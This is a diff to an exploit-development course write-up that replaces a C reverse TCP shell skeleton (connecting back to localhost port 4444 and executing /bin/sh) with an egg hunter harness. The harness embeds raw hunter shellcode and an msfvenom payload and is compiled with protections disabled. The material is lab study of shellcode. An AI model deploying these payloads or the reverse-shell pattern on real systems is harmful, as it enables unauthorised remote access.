@@ -171,7 +171,7 @@ osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh egghunter
 [+] Done!
 ```
 
-#### Customize Shellcode for different payloads
+#### Customize Shellcode (Different payloads)
 ------
 
 Objdump is used to extract the shellcode from the Egg Hunter in hex format (Null free):
@@ -201,41 +201,43 @@ unsigned char buf[] =
 
 The Egg is appended twice to this newly generated payload, the tagged Egg would precede the payload with the value "\x90\x50\x90\x50\x90\x50\x90\x50".
 
-#### Reverse TCP Shell in C
+#### Egg Hunter in C
 --------
 
-The following C skeleton code will be used to demonstrate the Reverse TCP shell from a high-level language perspective. 
-
-This will be used as a template for the low-level assembly code to follow:
+The following C skeleton code will be used to demonstrate the Egg Hunter from a high-level language perspective. 
 
 ```c
+/**
+* Filename: shellcode.c
+* Author: h3ll0clar1c3
+* Purpose: Egghunter, spawning a shell on the local host  
+* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o egghunter_final  
+* Usage: ./egghunter_final
+* Shellcode size: ?? bytes
+* Architecture: x86
+**/
+
 #include <stdio.h>
 #include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
 
-int main(void) {
-    // Declare variables
-    int sockfd;
-    struct sockaddr_in serv_addr;
-    // Create socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    // IP address family
-    serv_addr.sin_family = AF_INET;
-    // Destination IP address
-    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
-    // Destination port 
-    serv_addr.sin_port = htons(4444);
-    // Reverse connect to target IP address
-    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
-    int i;
-    for (i=0; i <= 2; i++){
-        dup2(sockfd, i);
-    }
-    // Execute /bin/sh using execve  
-    char *argv[] = {"/bin/sh", NULL};
-    execve(argv[0], argv, NULL);
+unsigned char hunter[] = \
+"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee" // objdump -d
+"\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
+
+unsigned char egg[] = \
+"\x90\x50\x90\x50\x90\x50\x90\x50" // tagged egg
+"\xbd\xea\xfb\x87\x4a\xda\xdb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1" // msfvenom payload
+"\x0b\x31\x6a\x15\x03\x6a\x15\x83\xea\xfc\xe2\x1f\x91\x8c\x12"
+"\x46\x34\xf5\xca\x55\xda\x70\xed\xcd\x33\xf0\x9a\x0d\x24\xd9"
+"\x38\x64\xda\xac\x5e\x24\xca\xa7\xa0\xc8\x0a\x97\xc2\xa1\x64"
+"\xc8\x71\x59\x79\x41\x25\x10\x98\xa0\x49";
+
+main()
+{
+printf("Hunter length: %d bytes\n", strlen(hunter));
+printf("Egg length: %d bytes\nHunting the egg...\n", strlen(egg));
+int (*ret)() = (int(*)())hunter;
+ret();
 }
 ```
 
